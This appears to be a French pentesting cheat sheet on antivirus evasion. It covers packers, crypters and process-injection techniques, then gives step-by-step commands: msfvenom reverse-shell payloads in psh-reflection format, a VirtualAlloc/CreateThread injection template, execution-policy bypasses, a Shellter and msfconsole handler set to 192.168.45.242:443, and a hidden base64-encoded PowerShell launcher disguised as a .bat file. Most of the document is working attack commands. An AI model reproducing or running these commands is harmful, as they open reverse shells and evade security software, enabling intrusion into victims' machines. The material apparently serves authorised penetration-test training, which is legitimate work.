# Théorie
## On-disk Evasion

| Technique              | Principe                                                   | Efficacité           |
| ---------------------- | ---------------------------------------------------------- | -------------------- |
| **Packer**             | Recompresse l'exécutable → nouveau hash                    | Faible (AV modernes) |
| **Obfuscator**         | Mute le code (dead code, réordonnancement)                 | Moyenne              |
| **Crypter**            | Chiffre le binaire, déchiffrement en mémoire à l'exécution | Haute                |
| **Software Protector** | Combine tout + anti-debug, anti-VM, anti-reversing         | Haute                |

## In-Memory Evasion

Manipulation de la mémoire volatile uniquement, rien n'est écrit sur disque.

|Technique|Principe|
|---|---|
|**Remote Process Injection**|Injection dans un processus légitime via `OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread`|
|**Reflective DLL Injection**|Chargement d'une DLL depuis la mémoire sans `LoadLibrary` (API réimplémentée par l'attaquant)|
|**Process Hollowing**|Lancer un processus légitime suspendu → vider son image → remplacer par le payload → reprendre|
|**Inline Hooking**|Modifier une fonction en mémoire pour rediriger vers du code malveillant, puis retour au flux normal|

# Check MAJ Windows

```powershell
$s = (New-Object -ComObject Microsoft.Update.Session).CreateUpdateSearcher()
$s.Search("IsInstalled=0 and Type='Software'").Updates | Select Title
```
Résultat vide = à jour.

# PowerShell Thread Injection

- https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py
## 1. Générer le payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=443 -f psh-reflection
```

> Le format `psh-reflection` génère un script PowerShell avec des noms de variables aléatoires (re-générer à chaque engagement) et le shellcode encodé en base64.

## 2. Construire le script

Coller l'output de msfvenom dans le template :

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

<place shellcode here>
```

Sauvegarder en `bypass.ps1`.

## 3. Débloquer l'execution policy (cible Windows)

```powershell
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

> Alternative par script : `powershell -ExecutionPolicy Bypass .\bypass.ps1`

## 4. Exécution

```bash
nc -lvnp 443   # Sur la machine attaquante
.\bypass.ps1   # Sur la machine cible
```

# Shellter

```bash
# sudo dpkg --add-architecture i386
# sudo apt update && apt -y install wine32

# https://gitlab.winehq.org/wine/wine/-/wikis/Debian-Ubuntu
# Utiliser version debian de testing pour kali

sudo apt install shellter

msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.242;set LPORT 443;run;"
```

# .bat

Réutiliser le payload de **PowerShell Thread Injection** et l'utiliser ainsi :

```bash
# Générer le payload powershell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.242 LPORT=443 -f psh-reflection -o script.ps1

# Transformer en base64
python3 ../tools/ps_encoder.py --script script.ps1 >> script64.ps1

# Ajouter au début de script64.ps1
powershell -nop -noni -w hidden -ep bypass -e <BASE64_PAYLOAD>

# Renommer
mv script64.ps1 script64.bat
```